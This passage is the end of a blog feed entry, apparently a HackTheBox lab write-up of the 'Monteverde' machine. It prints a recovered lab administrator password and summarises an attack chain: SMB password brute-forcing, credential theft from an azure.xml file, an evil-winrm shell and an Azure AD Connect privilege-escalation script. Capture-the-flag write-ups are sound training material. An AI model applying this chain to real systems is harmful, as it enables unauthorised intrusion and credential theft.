+![deploy using travis](/assets/img/posts/HTB/Monteverde/9.png){:class=&quot;img-fluid&quot;}  
+
+&amp;nbsp;
+
+### 3.2 || Privileged Shell
+
+Using the genrated credentials by the script (`administrator:d0m@in4adminyeah!`), we were able to get the highest level of privilege of the machine.
+
+![deploy using travis](/assets/img/posts/HTB/Monteverde/10.png){:class=&quot;img-fluid&quot;}  
+
+&amp;nbsp;
+
+### 3.3 || root.txt
+
+![deploy using travis](/assets/img/posts/HTB/Monteverde/11.png){:class=&quot;img-fluid&quot;}  
+
+## Key Takeway:
+
+As the main motto to build HackTheBox platform for security researchers is to help us hone our testing skills and hence, every machine has its key takeways.
+
+For me, the key takeway was a reminder for basic routine check of security misconfiguration where the password of one the users were set as the username itself.</content><author><name>Rajat Rao</name></author><category term="HackTheBox" /><summary type="html">Brief     On enumerating different services of Monteverde machine, we were able extract list of users available in the target machine. Due to security misconfiguration, one of the users has set the password same as the username and this was identified by brute forcing the same using smb_login module from metasploit. Levering the misconfiguration, we were able to login to SMB with the help of smbclient and on further enumeration, we were able to extract a file named azure.xml under mhope user folder consisting of credentails of the same user. Making the use of credential found, we were able to get Windows Remote Management shell with the help of tool named evil-winrm which targets on port 5985 port. Here, we were able to get basic shell and were able pwn the user.txt part of the challenge. Moving to privilege escalation part, enumemrating local system, we were able to understand the target machine has Azure Active Directory Connect. On searching for exploits on google, we were able to find a script and privilege to highest level of authorization and complete the final challenge of getting root.txt</summary></entry></feed>
